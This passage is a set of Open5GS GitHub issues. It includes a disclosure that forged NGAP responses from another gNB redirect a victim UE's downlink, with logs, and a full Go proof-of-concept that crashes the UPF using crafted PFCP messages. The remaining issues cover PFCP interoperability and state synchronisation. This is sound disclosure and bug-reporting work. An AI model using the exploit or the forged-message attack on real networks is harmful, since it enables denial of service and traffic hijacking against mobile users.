   - `AMF-UE-NGAP-ID` = the victim's value
   - `RAN-UE-NGAP-ID` = the victim's value 
   - `PDUSessionResourceSetupResponseTransfer` containing a GTP-U endpoint controlled by the attacker (test value: IP `6.6.6.6`, TEID `0xDEAD`).

4. Observe the AMF debug log and the SMF response.

**Observed Result:**

Victim UE registers via gNB-A (`10.3.0.3`) and is allocated `AMF_UE_NGAP_ID=1`, `RAN_UE_NGAP_ID=1`:

```
04/27 14:06:02.196: [amf] INFO:     RAN_UE_NGAP_ID[1] AMF_UE_NGAP_ID[1] TAC[1] CellID[0x10]   ← victim UE on gNB-A
04/27 14:06:02.... : [amf] INFO: [imsi-001019756139935:1:11] /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify  ← legitimate PDU session established (DNN: internet)
```

gNB-B then completes its own NG Setup and fires a single forged response:

```
04/27 14:06:24.575: [amf] INFO: gNB-N2 accepted[10.3.0.33]:44857 in ng-path module          ← gNB-B SCTP up
04/27 14:06:24.581: [amf] DEBUG:     IP[10.3.0.33] RAN_ID[2]                                ← gNB-B NG Setup completes
04/27 14:06:28.657: [amf] DEBUG: PDUSessionResourceSetupResponse                            ← single forged message from gNB-B
04/27 14:06:28.657: [amf] DEBUG:     IP[10.3.0.33] RAN_ID[2]                                  (sending TNLA = gNB-B, NOT the victim's serving gNB)
04/27 14:06:28.657: [amf] DEBUG:     SUPI[imsi-001019756139935] PSI[1] OLD ACTIVATED[0x2]    (resolved to victim UE on gNB-A)
04/27 14:06:28.657: [sbi] DEBUG: [POST] http://127.0.0.4:7777/nsmf-pdusession/v1/sm-contexts/1/modify
04/27 14:06:28.658: [sbi] DEBUG: [204:POST] http://127.0.0.4:7777/nsmf-pdusession/v1/sm-contexts/1/modify
04/27 14:06:28.659: [amf] INFO: [imsi-001019756139935:1:11] /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify
                                                                                            ← attacker-supplied transfer accepted for the victim UE
```

The AMF accepted the response from gNB-B (`10.3.0.33`, `RAN_ID=2`) — a different gNB from the UE's serving gNB-A — and forwarded the attacker-supplied transfer to the SMF as `Nsmf_PDUSession_UpdateSMContext`. The SMF returned `204 No Content` — the success path — meaning the modification (with the attacker-supplied N3 endpoint) was accepted and propagated downstream toward the UPF for FAR update. The victim's IMSI (`imsi-001019756139935`) appears in the AMF's audit line for the modify call, confirming that the attacker's payload was applied to the victim's PDU session, not gNB-B's own (gNB-B has none).

No Error Indication was emitted toward gNB-B for this response, and the UE-associated logical NG-connection on gNB-A was not released.

pcap:
[UE Downlink Redirection via Forged PDUSessionResourceSetupResponse.zip](https://github.com/user-attachments/files/27116371/UE.Downlink.Redirection.via.Forged.PDUSessionResourceSetupResponse.zip)

### Expected Behaviour

When the AMF resolves a UE-associated NGAP message by `AMF-UE-NGAP-ID`, it should additionally verify that the message arrived on the SCTP/TNLA association bound to the resolved UE's serving gNB. Concretely, after the lookup, the AMF should compare the sending NG-RAN node (the `gnb` the message was received from) against `ran_ue->gnb`. If they differ, the message must be rejected:

- the AMF must not propagate the message contents (e.g. a `PDUSessionResourceSetupResponseTransfer`) to the SMF or any other downstream NF, and
- the AMF should respond with an Error Indication on the offending TNLA.

This is a basic authorization invariant: only the gNB that owns the UE-associated logical NG-connection may submit responses on behalf of that UE.

### Observed Behaviour

`ran_ue_find_by_amf_ue_ngap_id()` (`src/amf/context.c:1475`) is a process-wide pool lookup that does not take the sending gNB as an argument, and the PDU session response handler (`src/amf/ngap-handler.c:1959`) does not perform any subsequent `ran_ue->gnb == gnb` check. As a result, a `PDUSessionResourceSetupResponse` arriving on the SCTP association of gNB-B but carrying an `AMF-UE-NGAP-ID` that belongs to a UE attached via gNB-A is treated as a legitimate response from the UE's serving gNB.

In the captured run 

- Packets 1–24: victim UE registers on gNB-A (`10.3.0.3`), AMF allocates `AMF_UE_NGAP_ID=1` / `RAN_UE_NGAP_ID=1`, one PDU session (DNN `internet`) is established legitimately.
- Packets 25–30, 39–40: SCTP heartbeats (idle period — no UE-plane activity between registration and the attack).
- Packets 31–38: gNB-B (`10.3.0.33`) brings up its own SCTP association with the AMF and completes NG Setup (`RAN_ID=2`).
- Packet 41: gNB-B sends a **single** `PDUSessionResourceSetupResponse` containing the matched IDs (`AMF_UE_NGAP_ID=1`, `RAN_UE_NGAP_ID=1`) and the attacker's GTP-U endpoint (`6.6.6.6` / `0xDEAD`).
- AMF behaviour: lookup by `AMF-UE-NGAP-ID` resolves to the victim's context (whose serving gNB is gNB-A), no comparison of sending TNLA against `ran_ue->gnb` is performed, the attacker-supplied transfer is forwarded to the SMF (`POST /nsmf-pdusession/v1/sm-contexts/1/modify`), and the SMF returns `204 No Content` — programming the new N3 endpoint downstream toward the UPF. The audit line `[imsi-001019756139935:1:11]` confirms the modify was applied to the victim UE's PDU session.

The IDs in the incoming message are identical to the values the AMF has stored for the victim — so a hypothetical value-consistency check (e.g. "received `RAN-UE-NGAP-ID` must equal `ran_ue->ran_ue_ngap_id`") would have passed. No mismatch is detected between the sending gNB and the UE's serving gNB, because no such check exists.


### eNodeB/gNodeB

UERANSIM v3.2.7

### UE Models and versions

UERANSIM v3.2.7

items.title: [Issue]:  UPF PFCP support for SMF with multiple IP addresses

labels.name: type:enhancement
labels.description: Enhance performance or improve usability of original features.

labels.name: Housekeeping:ToClose

items.body:
### Open5GS Release, Revision, or Tag

v.2.7.1

### Steps to reproduce

Since Release 16 there are features in the standard to support SMF with multiple IP addresses (more cloud compatible) like SSET or MPAS.  But even without those features the PFCP standard supports that both SMF and UPF have multiple IP addresses (see section 5.8.1 in TS 29244 "Only one PFCP association shall be setup between a given pair of CP and UP functions, even if the CP and/or UP function exposes multiple IP addresses. ") 

It is open to interpretation how to handle the situation in which a CP Function has several IP addresses. SSET and MPAS resolve that interpretation but without support for them there is room for a flexible interpretation that would provide some support for SMF with multiple IP addresses.

The Open5GS UPF right now does not support SMF with multiple IP addresses of any kind.  Even if the SMF in the Association Setup announces all its IP address in the Alternative SMF IP Address IE  (which the standard doesn't require) the Open5GS UPF will not accept a PFCP message other than a HeartBeat Request or an Association Setup Request unless it comes exactly from the same IP address from which  a previous Association Setup Request has happened. Even worse, the Open5GS UPF does not reply to the message providing any error, triggering that the CP retransmits the message until it considers the UPF problematic and sets it down.

I think its the call to xact functions that is causing the situation, that checks the source IP address matches the same source IP address of the association, probably when calling ogs_pfcp_xact_receive.

### Logs

_No response_

### Expected behaviour

If the PFCP Association Setup includes Node ID with an FQDN , independent whether it includes the Alternative SMF IP address or not, the UPF should behave as follows 
- In a PFCP Session Establishment Request if the Node ID is included with the same FQDN, that message has to be considered as coming from the associated SMF and processed accordingly independently of the Source IP address.  The F-SEID IE would include the IP address where the UPF sends Reports or other messages associated with that session
- In a PFCP Session Modification if the SEID matches the SEID allocated by the UPF, then it has to be accepted independent of the source IP address (there is no place in the standard that requires that). If the CP function has changed the IP address where it wants to receive reports for that session it can add the CP F-SEID IE into the message
- in a PFCP Session Deletion message, if the SEID matches the SEID allocated by the UPF, the UPF should accept it independent of the source IP address where it comes from.

I understand these behaviors for PFCP Session Modification or PFCP Session Deletion are rather unsecure, and I prefer that the UPF makes some check. If it were possible at least the UPF should reply with an error to those messages if its checking the source IP address and it didn't like it.  What I would suggest is that if the SMF has indicated during association an Alternative SMF IP Address the Open5GS  would accept messages from any of those IP addresses (the source IP address of the association or any of the Alternative ones). I would do the changes myself but the code is not commented enough for me to understand what's doing and I don't really understand the role of those xact functions and structures which seem to be the problematic ones.

### Observed Behaviour

Actually the UPF **does not reply at all** to a PFCP Session Establishment or Modification or Deletion when it doesn't come from the same IP address of the Association Setup even if the Node ID matches the one in the PFCP Association Setup Request which was accepted.

At a minimum I would find sensible that the Open5GS UPF  does reply with an error Response with Cause 72  which is "No Established PFCP Association"  the standard says "This cause shall be used by the CP function or the UP function if they receive a PFCP message other than the PFCP Association Setup Request and the Heartbeat Request message from a peer with which there is no established PFCP Association."

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.body:
### Open5GS Release, Revision, or Tag

v2.7.2

### Steps to reproduce

Sending a pfcp NewSessionEstablishmentRequest packet with  restoration_indication = true and (teid = 0 or teid > ogs_pfcp_pdr_teid_pool.size) would cause the UPF to reach an assertion in line `1365` of `lib/pfcp/context.c` and crash. The size of ogs_pfcp_pdr_teid_pool is  `max_ue * 4 * 16`. The issue can be reproduced by starting the upf only.

1. start a new go project inside a new folder: `go mod init ogs_poc`
2. create a `main.go` and paste the  code below:
3. download required libraries: `go mod tidy`
4. run the program with the upf pfcp server address: `go run main.go 10.22.77.2` 

 
```go
package main
import (
	"flag"
	"fmt"
	"github.com/wmnsk/go-pfcp/ie"
	"github.com/wmnsk/go-pfcp/message"
	"log"
	"net"
)

func execPayload(host string) error {
	// random ip used as node id address
	var addr = "1.1.1.1"
	addrIp := net.ParseIP(addr)

	// create udp connection to upf
	conn, err := net.Dial("udp", host)
	if err != nil {
		return fmt.Errorf("net.Dial: %v", err)
	}
	defer conn.Close()

	// create NewAssociationSetupRequest
	asReq, _ := message.NewAssociationSetupRequest(
		0, ie.NewNodeID(addr, "", ""),
	).Marshal()

	// create NewSessionEstablishmentRequest
	seReq, _ := message.NewSessionEstablishmentRequest(0, 0, 0x0, 1, 0,
		ie.NewNodeID(addr, "", ""),
		ie.NewFSEID(0x0, addrIp, nil),
		ie.NewCreatePDR(
			ie.NewPDRID(0),
			ie.NewPDI(
				ie.NewSourceInterface(0),
				// (teid = 0 or teid = max_ue*4*16) and pfcpSEReq = 1
				ie.NewFTEID(1, 1024*4*16+1, addrIp, nil, 0),
			)),
		// pfcpSEReq = 1 -> Restoration Indication = Present
		ie.NewPFCPSEReqFlags(1),
	).Marshal()

	// send association setup
	conn.Write(asReq)
	fmt.Printf("sent NewAssociationSetupRequest 0x%x\n", asReq)

	// send session establishment with payload
	conn.Write(seReq)
	fmt.Printf("sent NewSessionEstablishmentRequest 0x%x\n", seReq)

	return nil
}

func main() {

	var (
		port = flag.Int("p", 8805, "upf pfcp port")
	)
	flag.Parse()
	if len(flag.Args()) != 1 {
		log.Fatal("set pfcp upf host")
	}
	host := fmt.Sprintf("%v:%d", flag.Arg(0), *port)

	err := execPayload(host)
	if err != nil {
		log.Fatalf("execPayload: %v", err)
	}
}
```

items.title: SMF - PFCP Session Establishment response without F-TEID

labels.name: type:bug
labels.description: Open5GS bug

items.body:
**SMF reports error if PFCP Association Setup response without UP Function Features is received** from UPF:
*[pfcp] ERROR: F-TEID allocation/release not supported with peer*
>3GPP 29.244:
>7.4.4.2  PFCP Association Setup Response / Table 7.4.4.2-1: Information Elements in a PFCP Association Setup Response
>-UP Function Features (C) - This IE shall be present if the UP function sends this message and the UP function supports at least one UP feature defined in this IE. When present, this IE shall indicate the features the UP function supports.

Our interpretation: If the UP function does not support any UP feature, the IE “UP Function Features” does not need to be present in PFCP Association Setup Response.

SMF assigned the Local F-TEID IE of the PDR IE and provided the assigned F-TEID value to the UP function in PFCP Session Establishment request. The CH (CHOOSE) flag was set to False. But **SMF does not proceed with Session Establishment procedure if PFCP Session Establishment response without F-TEID is received** and reports errors:
*[smf] ERROR: F-TEID allocation/release not supported with peer [127.0.0.7]:8805 (../src/smf/npcf-handler.c:528)
[smf] ERROR: No Created PDR (../src/smf/n4-handler.c:178)*
>3GPP 29.244:
>7.5.2.2  Create PDR IE within PFCP Session Establishment Request / Table 7.5.2.2-2: PDI IE within PFCP Session Establishment Request
>-The CP function shall set the CHOOSE (CH) bit to 1 if the CP function requests the UP function to assign a local F-TEID to the PDR.
>7.5.3.2  Created PDR IE within PFCP Session Establishment Response / Table 7.5.3.2-1: Created PDR IE within PFCP Session Establishment Response
>-Local F-TEID (C) - If the UP function allocates the F-TEID, this IE shall be present and shall contain the local F-TEID to be used for this PDR.

Our interpretation: because the “Local F-TEID” was not requested by CP (CH (CHOOSE) flag set to False) in the PFCP Session Establishment Request, the CP should support UP which does not allocate F-TEID and therefore no Created PDR IE is needed in PFCP Session Establishment Response.

SMF should:
- not report error on reception of PFCP Association Setup response without the FTUP feature flag in the UP Function Features IE.
- proceed with Session Establishment procedure if PFCP Session Establishment response without F-TEID is received.

This bug prevents usage of other vendor’s UPFs with Open5gs core.

items.title: feedback requested: PFCP synchronization?
items.body:
Hi everyone,

We have an architecture where the UPS (sgwu and upf) runs on a separate machine from the CPS (hss, pcrf, mme, sgwc, smf). Occasionally the UPS (or components on it) will crash and restart, and when this happens it creates all sorts of problems relating to the state mis-match between the CPS side (sgwc and smf) and UPS side (sgwu and upf). This generally stems from the fact that when the UPS side (sgwu and upf) restarts it loses all PFCP state. Already attached UEs cannot send traffic (since no session exists), UE disconnects fail, etc etc. I often end up having to restart the entire CPS to get everything back in sync.

I have dug through the relevant 3gpp docs for PFCP and GTPv2 and can't seem to find a great way to handle this situation in a clean, 3gpp-specific way. I think I have an okay idea for a solution, but want to hear ideas and collect as much input as possible before I start working on such a fix.

0) My main idea for a fix is to treat the CPS side (sgwc and smf) as authoritative. It handles all GTP traffic normally and stays in sync with mme, etc. Whenever there is a discrepancy, we assume that the CPS side is accurate. All fixes/modifications that follow are to help the UPS figure out the CPS'es state and get in sync with it.

1) From the CPS side, treat a PFCP de-association as if the UPS has crashed. "Save" all active sessions for that UPS element in a list somewhere. If we get any GTPv2 messages relating to these sessions (e.g. modify or delete), we can handle them directly, modify our saved sessions list correctly and send a successful response, but we don't forward these messages to UPS since we have no active association. New associations fail (as standard) due to lack of PFCP context.

2) From the UPS side (sgwu and upf), when you PFCP de-associate, destroy all active sessions that are associated with that CPS. This way, no matter what, when a UPS entity successfully creates a new PFCP association (either after extended network outage or a crash, it doesnt matter) the CPS can know that the UPS has zero active sessions from it.

3) When a UPS re-associates with CPS, the CPS sends create session messages for all the "saved" sessions mentioned in (1). Based on (2) we should know that at association time the UPS has no active sessions, so this should get us in sync.

4) Related, I would like to add some CPS/UPS code to handle other edge-cases by deferring to the CPS whenever possible, and keeping an eye towards state. e.g., if the CPS sends a Delete Session Request and the UPS has no session to speak of, don't error out, respond correctly, since technically the outcome is correct.

I believe this will take some work, but not too much. Please let me know what you think, or if there's another way to handle this that I haven't considered or found online - I'm super interested in finding the best way to fix this problem.
